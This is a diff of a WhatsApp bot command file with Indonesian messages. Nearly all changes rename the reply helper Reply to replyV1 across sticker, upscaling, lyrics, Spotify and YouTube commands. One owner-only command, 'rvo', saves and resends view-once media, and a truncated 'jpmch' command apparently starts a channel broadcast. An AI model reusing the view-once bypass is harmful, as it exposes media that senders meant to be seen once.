+ if (!/image/.test(mime)) return replyV1("Reply gambar yang mau dihitamin dengan caption hitamin");
  const mediaPath = await conn.downloadAndSaveMediaMessage(qmsg);
  const buffer = fs.readFileSync(mediaPath);
  const base64Image = buffer.toString("base64");
@@ -29914,17 +29887,17 @@ const axios = require('axios');
  fs.unlinkSync(mediaPath);
  } catch (err) {
  console.log(err);
- Reply("Gagal memproses gambar.");
+ replyV1("Gagal memproses gambar.");
  }
 }
 break
 case "getwm":
 case "take":
 case "colong": {
-if (!m.quoted) return Reply("reply sticker nya+namamu")
+if (!m.quoted) return replyV1("reply sticker nya+namamu")
 
 let mime = (m.quoted.msg || m.quoted).mimetype || ""
-if (!/webp/.test(mime)) return Reply("itu bukan sticker")
+if (!/webp/.test(mime)) return replyV1("itu bukan sticker")
 
 let media = await m.quoted.download()
 
@@ -29938,8 +29911,8 @@ author: author
 }
 break
 case "s": case "sticker": case "stiker": {
-if (!/image|video/gi.test(mime)) return Reply(example("dengan kirim media"))
-if (/video/gi.test(mime) && qmsg.seconds > 15) return Reply("Durasi vidio maksimal 15 detik!")
+if (!/image|video/gi.test(mime)) return replyV1(example("dengan kirim media"))
+if (/video/gi.test(mime) && qmsg.seconds > 15) return replyV1("Durasi vidio maksimal 15 detik!")
 var image = await conn.downloadAndSaveMediaMessage(qmsg)
 await conn.sendAsSticker(m.chat, image, m, {packname: global.packname})
 await fs.unlinkSync(image)
@@ -29947,11 +29920,11 @@ await fs.unlinkSync(image)
 break
 
 case "emojimix": {
-if (!text) return Reply(example('😀|😍'))
-if (!text.split("|")) return Reply(example('😀|??'))
+if (!text) return replyV1(example('😀|😍'))
+if (!text.split("|")) return replyV1(example('😀|??'))
 let [e1, e2] = text.split("|")
 const tenorApiKey = getXeryuuPrivateKey('tenorApiKey', 'TENOR_API_KEY', ['tenorApiKey']);
-if (!tenorApiKey) return Reply('⚙️ API Emoji Kitchen belum dikonfigurasi. Isi TENOR_API_KEY atau apiKeys.tenorApiKey di authen.js lokal.');
+if (!tenorApiKey) return replyV1('⚙️ API Emoji Kitchen belum dikonfigurasi. Isi TENOR_API_KEY atau apiKeys.tenorApiKey di authen.js lokal.');
 let brat = `https://tenor.googleapis.com/v2/featured?key=${encodeURIComponent(tenorApiKey)}&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(e1)}&emoji2=${encodeURIComponent(e2)}`
 let videoBuffer = await getBuffer(brat)
 try {
@@ -29961,7 +29934,7 @@ await conn.sendAsSticker(m.chat, videoBuffer, m, {packname: global.packname})
 break
 
 case "emojigif": {
-if (!text) return Reply(example('😍'))
+if (!text) return replyV1(example('😍'))
 try {
 const axios = require('axios');
 let brat = `https://restapi-v2.simplebot.my.id/tools/emojitogif?emoji=${encodeURIComponent(text)}`;
@@ -30048,17 +30021,17 @@ case 'hd': {
     };
 
     if (!/image/.test(m.quoted.mimetype || '')) {
-        return Reply('Reply/kirim gambar dengan command .hd 2x atau .hd 4x');
+        return replyV1('Reply/kirim gambar dengan command .hd 2x atau .hd 4x');
     }
 
     const scale = args[0]?.replace(/x/i, '') || '2';
     if (!availableScaleRatio.includes(Number(scale))) {
-        return Reply('Pilih resolusi: 2x atau 4x');
+        return replyV1('Pilih resolusi: 2x atau 4x');
     }
 
     let tmpPath;
     try {
-        await Reply('⏳ Sedang memproses gambar, mohon tunggu...');
+        await replyV1('⏳ Sedang memproses gambar, mohon tunggu...');
         
 const buffer = await conn.downloadMediaMessage(m.quoted);
         const tmpDir = './tmp';
@@ -30083,7 +30056,7 @@ const buffer = await conn.downloadMediaMessage(m.quoted);
         }, { quoted: m });
 
     } catch (e) {
-        Reply(`Terjadi error: ${e.message}`);
+        replyV1(`Terjadi error: ${e.message}`);
     } finally {
         const fs = require('fs');
         if (tmpPath && fs.existsSync(tmpPath)) {
@@ -30098,7 +30071,7 @@ case 'hd2': {
     const media = q.msg || q;
     const mime = String(media.mimetype || q.mimetype || q.mediaType || '').toLowerCase();
     if (!/^image\//.test(mime) && !/^video\//.test(mime)) {
-        return Reply(`✨ HD2 — PENINGKATAN MEDIA\n\nBalas foto atau video yang ingin ditingkatkan, lalu ketik ${prefix}hd2.\n\n🖼️ Foto: pilih 2x atau 4x\n🎬 Video: pilih 720p, 1080p, 2K, atau 4K\n\n⏳ Pilihan tombol berlaku 3 menit.`);
+        return replyV1(`✨ HD2 — PENINGKATAN MEDIA\n\nBalas foto atau video yang ingin ditingkatkan, lalu ketik ${prefix}hd2.\n\n🖼️ Foto: pilih 2x atau 4x\n🎬 Video: pilih 720p, 1080p, 2K, atau 4K\n\n⏳ Pilihan tombol berlaku 3 menit.`);
     }
     const option = String(args[0] || '').toLowerCase().replace(/p$/, '').replace(/x$/, '');
     if (!args[0]) {
@@ -30106,10 +30079,10 @@ case 'hd2': {
             return await cacheHd2MediaAndShowButtons(q, mime);
         } catch (error) {
             console.error('[HD2 MENU ERROR]', error?.stack || error);
-            return Reply(`❌ Tidak bisa menyiapkan pilihan HD. ${error?.message || 'Coba kirim ulang medianya.'}`);
+            return replyV1(`❌ Tidak bisa menyiapkan pilihan HD. ${error?.message || 'Coba kirim ulang medianya.'}`);
         }
     }
-    if (conn.hd2Busy?.has(m.sender)) return Reply('⏳ Proses HD kamu masih berjalan. Tunggu sampai selesai, ya.');
+    if (conn.hd2Busy?.has(m.sender)) return replyV1('⏳ Proses HD kamu masih berjalan. Tunggu sampai selesai, ya.');
     try {
         const buffer = await downloadHd2MediaBuffer(q);
         const limit = /^image\//.test(mime) ? 18 * 1024 * 1024 : 42 * 1024 * 1024;
@@ -30118,7 +30091,7 @@ case 'hd2': {
         return await runHd2Enhancement(buffer, mime, option, m);
     } catch (error) {
         console.error('[HD2 ERROR]', error?.stack || error);
-        return Reply(`❌ Proses HD gagal. ${error?.message || 'Coba lagi dengan file yang lebih kecil atau resolusi lebih rendah.'}`);
+        return replyV1(`❌ Proses HD gagal. ${error?.message || 'Coba lagi dengan file yang lebih kecil atau resolusi lebih rendah.'}`);
     }
 }
 break
@@ -30130,15 +30103,15 @@ case 'hd2select': {
     const pending = conn.hd2Pending.get(key);
     if (!pending || pending.expiresAt <= Date.now()) {
         conn.hd2Pending.delete(key);
-        return Reply(`⌛ Pilihan HD sudah kedaluwarsa. Balas foto/video dengan ${prefix}hd2 untuk membuka tombol baru.`);
+        return replyV1(`⌛ Pilihan HD sudah kedaluwarsa. Balas foto/video dengan ${prefix}hd2 untuk membuka tombol baru.`);
     }
-    if (conn.hd2Busy?.has(m.sender)) return Reply('⏳ Proses HD kamu masih berjalan. Tunggu sampai selesai, ya.');
+    if (conn.hd2Busy?.has(m.sender)) return replyV1('⏳ Proses HD kamu masih berjalan. Tunggu sampai selesai, ya.');
     const option = String(args[0] || '').toLowerCase().replace(/p$/, '').replace(/x$/, '');
     if (/^image\//.test(pending.mime) && !['2', '4'].includes(option)) {
-        return Reply(`Untuk foto, pilih ${prefix}hd2select 2x atau ${prefix}hd2select 4x.`);
+        return replyV1(`Untuk foto, pilih ${prefix}hd2select 2x atau ${prefix}hd2select 4x.`);
     }
     if (/^video\//.test(pending.mime) && !['720', '1080', '2k', '1440', '4k', '2160'].includes(option)) {
-        return Reply(`Untuk video, pilih ${prefix}hd2select 720p / 1080p / 2k / 4k.`);
+        return replyV1(`Untuk video, pilih ${prefix}hd2select 720p / 1080p / 2k / 4k.`);
     }
     conn.hd2Pending.delete(key);
     return runHd2Enhancement(pending.buffer, pending.mime, option, m);
@@ -30147,9 +30120,9 @@ break
 
 case 'hdvideo': {
     conn.videohd = conn.videohd || {};
-    if (m.sender in conn.videohd) return Reply("Sabar, lagi proses ya, jangan dispam.");
+    if (m.sender in conn.videohd) return replyV1("Sabar, lagi proses ya, jangan dispam.");
 
-    if (!text) return Reply(`Contoh: ${prefix + command} 1080 60fps`);
+    if (!text) return replyV1(`Contoh: ${prefix + command} 1080 60fps`);
 
     const resolutions = {
         "480": "480", "720": "720", "1080": "1080",
@@ -30161,22 +30134,22 @@ case 'hdvideo': {
     if (fpsText && fpsText.endsWith("fps")) {
         fps = parseInt(fpsText.replace("fps", ""));
         if (isNaN(fps) || fps < 30 || fps > 240) {
-            return Reply("❗ FPS harus antara 30 - 240 (contoh: 60fps)");
+            return replyV1("❗ FPS harus antara 30 - 240 (contoh: 60fps)");
         }
     }
 
     let q = m.quoted ? m.quoted : m;
     let mime = (q.msg || q).mimetype || q.mediaType || '';
-    if (!/^video/.test(mime)) return Reply("Perintah ini hanya untuk video. Silakan Reply video yang ingin diubah.");
+    if (!/^video/.test(mime)) return replyV1("Perintah ini hanya untuk video. Silakan Reply video yang ingin diubah.");
     
-    if (!resolutions[res]) return Reply(`Resolusi tidak valid.\n\nPilihan: ${Object.keys(resolutions).join(", ")}\nContoh: ${prefix + command} 1080`);
+    if (!resolutions[res]) return replyV1(`Resolusi tidak valid.\n\nPilihan: ${Object.keys(resolutions).join(", ")}\nContoh: ${prefix + command} 1080`);
 
     conn.videohd[m.sender] = true;
     let inputPath;
     let outputPath;
 
     try {
-        await Reply(`⏳ Mengubah video ke ${res.toUpperCase()} ${fps}FPS...`);
+        await replyV1(`⏳ Mengubah video ke ${res.toUpperCase()} ${fps}FPS...`);
         
         const tmpDir = './tmp';
         if (!fs.existsSync(tmpDir)) {
@@ -30217,7 +30190,7 @@ case 'hdvideo': {
                     caption: `✅ Video berhasil diubah ke ${res.toUpperCase()} ${fps}FPS`
                 }, { quoted: m });
             } catch (sendError) {
-                Reply("Gagal mengirim video yang telah diproses.");
+                replyV1("Gagal mengirim video yang telah diproses.");
             } finally {
                 delete conn.videohd[m.sender];
                 if (fs.existsSync(inputPath)) fs.unlinkSync(inputPath);
@@ -30230,7 +30203,7 @@ case 'hdvideo': {
         });
 
     } catch (e) {
-        Reply("Terjadi kesalahan: " + e.message);
+        replyV1("Terjadi kesalahan: " + e.message);
         delete conn.videohd[m.sender];
         if (inputPath && fs.existsSync(inputPath)) fs.unlinkSync(inputPath);
         if (outputPath && fs.existsSync(outputPath)) fs.unlinkSync(outputPath);
@@ -30241,19 +30214,19 @@ break
             case 'bratvid':
             case 'bratvideo': {
                 const bratVideoText = String(text || m.quoted?.text || m.quoted?.body || '').trim()
-                if (!bratVideoText) return Reply(`Contoh: ${prefix + command} halo dunia`)
+                if (!bratVideoText) return replyV1(`Contoh: ${prefix + command} halo dunia`)
                 try {
                     const stickerBuffer = await bratService.createBratVideoSticker(bratVideoText)
                     await conn.sendMessage(m.chat, { sticker: stickerBuffer }, { quoted: m })
                 } catch (error) {
                     console.error('[BRAT VIDEO]', error?.stack || error)
-                    await Reply(`❌ Gagal membuat stiker brat bergerak.\n${String(error?.message || error).slice(0, 220)}`)
+                    await replyV1(`❌ Gagal membuat stiker brat bergerak.\n${String(error?.message || error).slice(0, 220)}`)
                 }
             }
             break;
 case "bratjalan": {
     const scrollingText = String(text || '').trim()
-    if (!scrollingText) return Reply(`Contoh: ${prefix + command} Halo dunia`)
+    if (!scrollingText) return replyV1(`Contoh: ${prefix + command} Halo dunia`)
     try {
         const stickerBuffer = await bratService.createScrollingBratSticker(scrollingText)
         await conn.sendAsSticker(m.chat, stickerBuffer, m, {
@@ -30262,14 +30235,14 @@ case "bratjalan": {
         })
     } catch (error) {
         console.error('[BRAT SCROLL]', error?.stack || error)
-        await Reply(`❌ Gagal membuat BRAT berjalan.\n${String(error?.message || error).slice(0, 220)}`)
+        await replyV1(`❌ Gagal membuat BRAT berjalan.\n${String(error?.message || error).slice(0, 220)}`)
     }
 }
 break
 
 case "brat": {
     const bratText = String(text || '').trim()
-    if (!bratText) return Reply(`Contoh: ${prefix + command} Halo dunia`)
+    if (!bratText) return replyV1(`Contoh: ${prefix + command} Halo dunia`)
     try {
         // Ikuti alur visual Furina: generator BRAT, peningkatan kualitas gambar,
         // lalu konversi ke stiker. Renderer hijau lokal menjadi fallback jika API mati.
@@ -30306,21 +30279,21 @@ case "brat": {
         })
     } catch (error) {
         console.error('[BRAT FURINA STYLE ERROR]', error?.stack || error)
-        await Reply(`❌ Gagal membuat stiker BRAT.\n${String(error?.message || error).slice(0, 220)}`)
+        await replyV1(`❌ Gagal membuat stiker BRAT.\n${String(error?.message || error).slice(0, 220)}`)
     }
 }
 break
 
 case 'furinabrat':
 case 'bratbahlil': {
-    if (!text?.trim()) return Reply(`Contoh: ${prefix + command} Halo dunia`)
+    if (!text?.trim()) return replyV1(`Contoh: ${prefix + command} Halo dunia`)
     const variant = command === 'bratbahlil' ? 'bahlil' : 'handwritten'
     try {
         const buffer = await bratService.createTemplateBrat(text.trim(), variant)
         await conn.sendAsSticker(m.chat, buffer, m, { packname: global.packname, author: global.author })
     } catch (error) {
         console.error(`[BRAT ${variant.toUpperCase()}]`, error?.stack || error)
-        await Reply(`❌ Gagal membuat stiker brat template.\n${String(error?.message || error).slice(0, 220)}`)
+        await replyV1(`❌ Gagal membuat stiker brat template.\n${String(error?.message || error).slice(0, 220)}`)
     }
 }
 break
@@ -30330,7 +30303,7 @@ case 'bratimg2':
 case 'bratgambar':
 case 'bratimg': {
     if (!text?.trim()) {
-        return Reply([
+        return replyV1([
             '*BRAT GAMBAR — FORMAT*',
             `${prefix + command} teks | warna teks | warna latar`,
             `Contoh: ${prefix + command} Halo dunia | #000000 | #FFFFFF`,
@@ -30347,13 +30320,13 @@ case 'bratimg': {
         await conn.sendAsSticker(m.chat, buffer, m, { packname: global.packname, author: global.author })
     } catch (error) {
         console.error('[BRAT ADVANCED]', error?.stack || error)
-        await Reply(`❌ Gagal membuat stiker brat.\n${String(error?.message || error).slice(0, 220)}`)
+        await replyV1(`❌ Gagal membuat stiker brat.\n${String(error?.message || error).slice(0, 220)}`)
     }
 }
 break
 case "cekidch": case "idch": {
-if (!text) return Reply(example("linkchnya 🤨"))
-if (!text.includes("https://whatsapp.com/channel/")) return Reply("Link tautan tidak valid")
+if (!text) return replyV1(example("linkchnya 🤨"))
+if (!text.includes("https://whatsapp.com/channel/")) return replyV1("Link tautan tidak valid")
 let result = text.split('https://whatsapp.com/channel/')[1]
 let res = await conn.newsletterMetadata("invite", result)
 let teks = `
@@ -30384,11 +30357,11 @@ messageId: msgii.key.id
 break
 
 case "rvo": case "readviewonce": {
-if (!isCreator) return Reply(mess.owner)
-if (!m.quoted) return Reply(example("dengan Reply pesannya"))
+if (!isCreator) return replyV1(mess.owner)
+if (!m.quoted) return replyV1(example("dengan Reply pesannya"))
 let msg = m.quoted.message
     let type = Object.keys(msg)[0]
-if (!msg[type].viewOnce) return Reply("Pesan itu bukan viewonce!")
+if (!msg[type].viewOnce) return replyV1("Pesan itu bukan viewonce!")
 let media = await downloadContentFromMessage(msg[type], type == 'imageMessage' ? 'image' : type == 'videoMessage' ? 'video' : 'audio')
     let buffer = Buffer.from([])
     for await (const chunk of media) {
@@ -30413,14 +30386,14 @@ case 'rtourl': {
     const mimetype = rawMime === 'image/jpg' ? 'image/jpeg' : rawMime
 
     if (!mimetype.startsWith('image/')) {
-        return Reply(
+        return replyV1(
             `❌ TOURL2 saat ini menggunakan Pixhost, yang hanya menerima gambar.\n` +
             `Format yang didukung: JPG/JPEG, PNG, GIF, WebP, dan AVIF (maksimal 10 MB).\n\n` +
             `Kirim atau reply sebuah gambar, lalu ketik *${usedPrefix + command}*.`
         )
     }
     if (!tourlService.isPixhostImageType(mimetype)) {
-        return Reply('❌ Format gambar tidak didukung Pixhost. Gunakan JPG/JPEG, PNG, GIF, WebP, atau AVIF.')
+        return replyV1('❌ Format gambar tidak didukung Pixhost. Gunakan JPG/JPEG, PNG, GIF, WebP, atau AVIF.')
     }
 
     try {
@@ -30466,11 +30439,11 @@ break
 case 'lyrics':
 case 'lirik': {
     const query = String(text || '').trim();
-    if (!query) return Reply(`🎼 *Lyrics / Lirik Lagu*\n\nContoh: ${prefix}lyrics NIKI lowkey`);
+    if (!query) return replyV1(`🎼 *Lyrics / Lirik Lagu*\n\nContoh: ${prefix}lyrics NIKI lowkey`);
     try {
         await conn.sendMessage(m.chat, { react: { text: '🔎', key: m.key } }).catch(() => {});
         const lyrics = await getLyrics(query);
-        if (!lyrics) return Reply('❌ Lirik tidak ditemukan. Coba gunakan judul lagu dan nama artis yang lebih lengkap.');
+        if (!lyrics) return replyV1('❌ Lirik tidak ditemukan. Coba gunakan judul lagu dan nama artis yang lebih lengkap.');
         let content = String(lyrics.plainLyrics || '').trim();
         if (!content && lyrics.syncedLyrics) {
             content = String(lyrics.syncedLyrics)
@@ -30479,7 +30452,7 @@ case 'lirik': {
                 .filter(Boolean)
                 .join('\n');
         }
-        if (!content) return Reply('❌ Lirik tersedia tetapi teksnya kosong.');
+        if (!content) return replyV1('❌ Lirik tersedia tetapi teksnya kosong.');
         const maxChunk = 3200;
         const chunks = [];
         for (let i = 0; i < content.length; i += maxChunk) chunks.push(content.slice(i, i + maxChunk));
@@ -30492,7 +30465,7 @@ case 'lirik': {
         await conn.sendMessage(m.chat, { react: { text: '✅', key: m.key } }).catch(() => {});
     } catch (error) {
         console.error('[LYRICS COMMAND ERROR]', error?.stack || error);
-        return Reply('❌ Gagal mengambil lirik saat ini. Coba lagi beberapa saat nanti.');
+        return replyV1('❌ Gagal mengambil lirik saat ini. Coba lagi beberapa saat nanti.');
     }
 }
 break;
@@ -30501,11 +30474,11 @@ case 'spsearch':
 case 'spotifysearch':
 case 'spotifyfind': {
     const query = String(text || '').trim();
-    if (!query) return Reply(`🎧 *Spotify Search*\n\nContoh: ${prefix}spsearch NIKI lowkey`);
+    if (!query) return replyV1(`🎧 *Spotify Search*\n\nContoh: ${prefix}spsearch NIKI lowkey`);
     try {
         await conn.sendMessage(m.chat, { react: { text: '🔎', key: m.key } }).catch(() => {});
         const tracks = await searchSpotifyTracks(query, 8);
-        if (!Array.isArray(tracks) || !tracks.length) return Reply('❌ Tidak ada track Spotify yang cocok dengan kata kunci tersebut.');
+        if (!Array.isArray(tracks) || !tracks.length) return replyV1('❌ Tidak ada track Spotify yang cocok dengan kata kunci tersebut.');
         const rows = tracks.map(track => ({
             title: `🎵 ${String(track.title || 'Track').replace(/[\r\n]/g, ' ').slice(0, 55)}`,
             description: `${String(track.artist || 'Unknown Artist').slice(0, 40)} • ${track.duration || '-'}`.slice(0, 72),
@@ -30543,7 +30516,7 @@ case 'spotifyfind': {
     } catch (error) {
         console.error('[SPOTIFY SEARCH ERROR]', error?.stack || error);
         await conn.sendMessage(m.chat, { react: { text: '❌', key: m.key } }).catch(() => {});
-        return Reply(`❌ Pencarian Spotify gagal. ${error?.message || 'Coba lagi beberapa saat nanti.'}`);
+        return replyV1(`❌ Pencarian Spotify gagal. ${error?.message || 'Coba lagi beberapa saat nanti.'}`);
     }
 }
 break;
@@ -30551,7 +30524,7 @@ break;
 case 'spdl':
 case 'spotifydl': {
     const input = String(text || '').trim();
-    if (!input) return Reply(`🎵 *Spotify Downloader*\n\nContoh: ${prefix}spdl https://open.spotify.com/track/ID`);
+    if (!input) return replyV1(`🎵 *Spotify Downloader*\n\nContoh: ${prefix}spdl https://open.spotify.com/track/ID`);
     try {
         await conn.sendMessage(m.chat, { react: { text: '⏳', key: m.key } }).catch(() => {});
         const media = await downloadSpotifyAudio(input);
@@ -30567,7 +30540,7 @@ case 'spotifydl': {
     } catch (error) {
         console.error('[SPOTIFY DOWNLOAD ERROR]', error?.stack || error);
         await conn.sendMessage(m.chat, { react: { text: '❌', key: m.key } }).catch(() => {});
-        return Reply(`❌ Gagal mengunduh track Spotify. ${error?.message || 'Penyedia sedang tidak tersedia.'}`);
+        return replyV1(`❌ Gagal mengunduh track Spotify. ${error?.message || 'Penyedia sedang tidak tersedia.'}`);
     }
 }
 break;
@@ -30576,7 +30549,7 @@ case 'rspotify':
 case 'spotifyrich':
 case 'richspotify': {
     const input = String(text || '').trim()
-    if (!input) return Reply(`Contoh: ${usedPrefix + command} https://open.spotify.com/track/ID
+    if (!input) return replyV1(`Contoh: ${usedPrefix + command} https://open.spotify.com/track/ID
 atau: ${usedPrefix + command} nama lagu`)
     try {
         await conn.sendMessage(m.chat, { react: { text: '🟢', key: m.key } })
@@ -30584,7 +30557,7 @@ atau: ${usedPrefix + command} nama lagu`)
         await conn.sendMessage(m.chat, { react: { text: '✅', key: m.key } })
     } catch (error) {
         console.error('[RICH SPOTIFY]', error?.stack || error)
-        return Reply(`❌ Gagal membuka Rich Spotify: ${error?.message || error}`)
+        return replyV1(`❌ Gagal membuka Rich Spotify: ${error?.message || error}`)
     }
 }
 break
@@ -30594,7 +30567,7 @@ case 'musicrich':
 case 'richyt':
 case 'rickyoutube':
 case 'ytrich': {
-    if (!text) return Reply(`Contoh: ${prefix}ytrich lofi chill`)
+    if (!text) return replyV1(`Contoh: ${prefix}ytrich lofi chill`)
     try {
         await conn.sendMessage(m.chat, { react: { text: '🔎', key: m.key } }).catch(() => {})
         
@@ -30620,7 +30593,7 @@ case 'ytrich': {
     } catch (error) {
         console.error('[RICH YOUTUBE]', error?.stack || error)
         await conn.sendMessage(m.chat, { react: { text: '❌', key: m.key } }).catch(() => {})
-        return Reply(`❌ YTRICH gagal: ${error?.message || error}`)
+        return replyV1(`❌ YTRICH gagal: ${error?.message || error}`)
     }
 }
 break
@@ -30629,7 +30602,7 @@ break
 case 'richstatus': {
     const base = publicApiBase()
     if (!base) {
-        return Reply(
+        return replyV1(
             `╭─〔 🔎 RICH API STATUS 〕\n` +
             `║ Status : *BELUM DIKONFIGURASI*\n` +
             `║ Port   : *${global.richApiConfig?.port || 3001}*\n` +
@@ -30645,7 +30618,7 @@ case 'richstatus': {
         const response = await fetch(`${base}/api/rich/health`, { signal: controller.signal })
         clearTimeout(timer)
         const data = await response.json().catch(() => ({}))
-        return Reply(
+        return replyV1(
             `╭─〔 🔎 RICH API STATUS 〕\n` +
             `║ URL    : *${base}*\n` +
             `║ HTTP   : *${response.status}*\n` +
@@ -30653,7 +30626,7 @@ case 'richstatus': {
             `╰────────────────`
         )
     } catch (e) {
-        return Reply(`❌ Rich API tidak dapat diakses dari bot.\nURL: *${base}*\nError: *${e?.message || e}*`)
+        return replyV1(`❌ Rich API tidak dapat diakses dari bot.\nURL: *${base}*\nError: *${e?.message || e}*`)
     }
 }
 break
@@ -30661,7 +30634,7 @@ break
 case 'yt':
 case 'youtube': {
  const axios = require('axios');
- if (!text) return Reply(`Contoh penggunaan:
+ if (!text) return replyV1(`Contoh penggunaan:
 • yt search XnalzNotDev
 • yt channel XnalzNotDev
 • yt latest alquiz ganteng
@@ -30670,14 +30643,14 @@ case 'youtube': {
  const subcmd = text.split(' ')[0].toLowerCase();
  const query = text.replace(subcmd, '').trim();
  const apikey = getXeryuuPrivateKey('youtubeApiKey', 'YOUTUBE_API_KEY', ['youtubeApiKey', 'googleApiKey']);
-  if (!apikey) return Reply('⚙️ YouTube Data API belum dikonfigurasi. Isi YOUTUBE_API_KEY atau apiKeys.youtubeApiKey di authen.js lokal.');
+  if (!apikey) return replyV1('⚙️ YouTube Data API belum dikonfigurasi. Isi YOUTUBE_API_KEY atau apiKeys.youtubeApiKey di authen.js lokal.');
 
  if (!['search', 'channel', 'latest', 'stat'].includes(subcmd))
- return Reply('Subfitur tidak dikenal. Gunakan salah satu: search, channel, latest, stat');
+ return replyV1('Subfitur tidak dikenal. Gunakan salah satu: search, channel, latest, stat');
 
  try {
  if (subcmd === 'search') {
- if (!query) return Reply('Contoh: yt search lofi chill');
+ if (!query) return replyV1('Contoh: yt search lofi chill');
  const { data } = await axios.get(`https://www.googleapis.com/youtube/v3/search`, {
  params: {
  part: 'snippet',
@@ -30688,18 +30661,18 @@ case 'youtube': {
  }
  });
 
- if (!data.items.length) return Reply('Video tidak ditemukan.');
+ if (!data.items.length) return replyV1('Video tidak ditemukan.');
  let teks = '*Hasil Pencarian YouTube:*\n\n';
  data.items.forEach(v => {
  teks += `• *${v.snippet.title}*\n`;
  teks += ` Channel: ${v.snippet.channelTitle}\n`;
  teks += ` Link: https://youtube.com/watch?v=${v.id.videoId}\n\n`;
  });
- return Reply(teks);
+ return replyV1(teks);
  }
 
  if (subcmd === 'channel') {
- if (!query) return Reply('Contoh: yt channel lofi girl');
+ if (!query) return replyV1('Contoh: yt channel lofi girl');
  const search = await axios.get(`https://www.googleapis.com/youtube/v3/search`, {
  params: {
  part: 'snippet',
@@ -30710,7 +30683,7 @@ case 'youtube': {
  });
 
  const ch = search.data.items[0];
- if (!ch) return Reply('Channel tidak ditemukan.');
+ if (!ch) return replyV1('Channel tidak ditemukan.');
  const channelId = ch.id.channelId;
  const detail = await axios.get(`https://www.googleapis.com/youtube/v3/channels`, {
  params: {
@@ -30721,7 +30694,7 @@ case 'youtube': {
  });
 
  const info = detail.data.items[0];
- if (!info) return Reply('Gagal mengambil detail channel.');
+ if (!info) return replyV1('Gagal mengambil detail channel.');
  const bannerUrl = info.brandingSettings?.image?.bannerExternalUrl;
  const cap = `*Channel Info:*
 • *Nama:* ${info.snippet.title}
@@ -30747,7 +30720,7 @@ case 'youtube': {
  }
 
  if (subcmd === 'latest') {
- if (!query) return Reply('Contoh: yt latest lofi girl');
+ if (!query) return replyV1('Contoh: yt latest lofi girl');
  const search = await axios.get(`https://www.googleapis.com/youtube/v3/search`, {
  params: {
  part: 'snippet',
@@ -30758,7 +30731,7 @@ case 'youtube': {
  });
 
  const ch = search.data.items[0];
- if (!ch) return Reply('Channel tidak ditemukan.');
+ if (!ch) return replyV1('Channel tidak ditemukan.');
  const channelId = ch.id.channelId;
  const latest = await axios.get(`https://www.googleapis.com/youtube/v3/search`, {
  params: {
@@ -30771,7 +30744,7 @@ case 'youtube': {
  });
 
  const vid = latest.data.items[0];
- if (!vid) return Reply('Video terbaru tidak ditemukan.');
+ if (!vid) return replyV1('Video terbaru tidak ditemukan.');
  const caption = `*Video Terbaru dari ${vid.snippet.channelTitle}:*
 • *Judul:* ${vid.snippet.title}
 • *Link:* https://youtube.com/watch?v=${vid.id.videoId}`;
@@ -30783,7 +30756,7 @@ case 'youtube': {
  }
 
  if (subcmd === 'stat') {
- if (!query.includes('youtube.com/watch')) return Reply('Contoh: yt stat https://youtube.com/watch?v=abc123');
+ if (!query.includes('youtube.com/watch')) return replyV1('Contoh: yt stat https://youtube.com/watch?v=abc123');
  const videoId = new URL(query).searchParams.get('v');
  const res = await axios.get(`https://www.googleapis.com/youtube/v3/videos`, {
  params: {
@@ -30794,7 +30767,7 @@ case 'youtube': {
  });
 
  const video = res.data.items[0];
- if (!video) return Reply('Video tidak ditemukan.');
+ if (!video) return replyV1('Video tidak ditemukan.');
  const cap = `*Statistik Video:*
 • *Judul:* ${video.snippet.title}
 • *Channel:* ${video.snippet.channelTitle}
@@ -30810,18 +30783,18 @@ case 'youtube': {
 
 *Deskripsi:* 
 ${video.snippet.description?.slice(0, 1000) || 'Tidak ada deskripsi.'}`;
- return Reply(cap);
+ return replyV1(cap);
  }
  } catch (err) {
  console.error(err);
- return Reply('Gagal mengambil data dari YouTube. Coba lagi nanti.');
+ return replyV1('Gagal mengambil data dari YouTube. Coba lagi nanti.');
  }
 }
 break
 case "carimusik":
 case "ytmp3": {
     const input = String(text || '').trim();
-    if (!input) return Reply(`🎵 *YouTube Music Downloader*\n\nGunakan: ${prefix}ytmp3 <judul lagu atau link YouTube>\nContoh: ${prefix}ytmp3 NIKI lowkey`);
+    if (!input) return replyV1(`🎵 *YouTube Music Downloader*\n\nGunakan: ${prefix}ytmp3 <judul lagu atau link YouTube>\nContoh: ${prefix}ytmp3 NIKI lowkey`);
     try {
         await conn.sendMessage(m.chat, { react: { text: '⏳', key: m.key } }).catch(() => {});
         let video;
@@ -30849,7 +30822,7 @@ case "ytmp3": {
     } catch (err) {
         console.error('[YTMP3 MUSIC DOWNLOAD ERROR]', err?.stack || err);
         await conn.sendMessage(m.chat, { react: { text: '❌', key: m.key } }).catch(() => {});
-        return Reply(`❌ Gagal mengunduh audio. ${err?.message || 'Penyedia audio sedang tidak tersedia.'}`);
+        return replyV1(`❌ Gagal mengunduh audio. ${err?.message || 'Penyedia audio sedang tidak tersedia.'}`);
     }
 }
 break;
@@ -30860,14 +30833,14 @@ case 'music':
 case 'playmusic':
 case 'playmusik': { 
 if (!text) { 
-return Reply(`*Penggunaan Salah!*\n\n + Contoh: ${cmd} Night Changes`) 
+return replyV1(`*Penggunaan Salah!*\n\n + Contoh: ${cmd} Night Changes`) 
   }
 try {
     const ytsSearchh = await yts(text)
     const searchItems = Array.isArray(ytsSearchh?.videos) ? ytsSearchh.videos : (ytsSearchh?.all || [])
     const results = searchItems.filter(v => normalizeYouTubeUrl(v?.url)).slice(0, 10)
     if (!results || results.length === 0) {
-        return Reply("❌ Result Not Found")
+        return replyV1("❌ Result Not Found")
     }
     if (!global.playSearch) {
         global.playSearch = {}
@@ -30929,26 +30902,26 @@ try {
         return;
     } catch (interactiveError) {
         console.error('[PLAY MENU BUTTON FALLBACK]', interactiveError?.message || interactiveError);
-        return Reply(teks);
+        return replyV1(teks);
     }
 } catch (err) {
     console.error("PLAY SEARCH ERROR:", err)
-    return Reply(`❌ Terjadi kesalahan saat mencari lagu! mungkin ada kesalahan di kode: ${err.message || err}`)
+    return replyV1(`❌ Terjadi kesalahan saat mencari lagu! mungkin ada kesalahan di kode: ${err.message || err}`)
   }
 } 
 break
 //~~~~~~~~~~~~~FITUR JPMCH~~~~~~~~~~~~~~~~~//
 
 case "jpmch": {
- if (!isCreator) return Reply(mess.owner) 
- if (!text && !m.quoted) return Reply(example("Teksnya atau Reply teks")); 
+ if (!isCreator) return replyV1(mess.owner) 
+ if (!text && !m.quoted) return replyV1(example("Teksnya atau Reply teks")); 
  var teks = m.quoted ? m.quoted.text : text; 
  let total = 0; 
  
